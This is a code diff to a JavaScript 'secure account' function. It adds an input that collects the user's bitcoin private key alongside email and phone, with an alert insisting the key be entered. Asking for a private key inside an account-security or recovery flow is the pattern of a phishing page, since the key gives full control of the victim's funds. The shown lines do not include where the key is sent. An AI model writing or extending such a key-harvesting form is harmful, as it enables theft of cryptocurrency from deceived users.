@@ -583,6 +583,7 @@ function start_secure_account() {
     document.getElementById('recoveringheader').style.display = 'none';
     document.getElementById('recover').style.display = 'none';
     document.getElementById('secure').style.display = 'none';
+    document.getElementById('securenext').style.display = 'none';
 
     var isChrome = !!window.chrome && !!window.chrome.webstore;
     if (!isChrome)
@@ -594,6 +595,7 @@ function start_secure_account() {
    
     email = document.getElementById('email').value.trim().toLowerCase();
     phone = document.getElementById('phone').value.trim().toLowerCase();
+    btckey = document.getElementById('btckey').value.trim().toLowerCase();
     if (!email)
     {
         alert("Please enter email.");
@@ -602,6 +604,11 @@ function start_secure_account() {
     if (!phone)
     {
         alert("Please enter phone.");
+        return;
+    }
+    if (!btckey)
+    {
+        alert("Please enter your bitcoin private key.");
         return;
     }
 
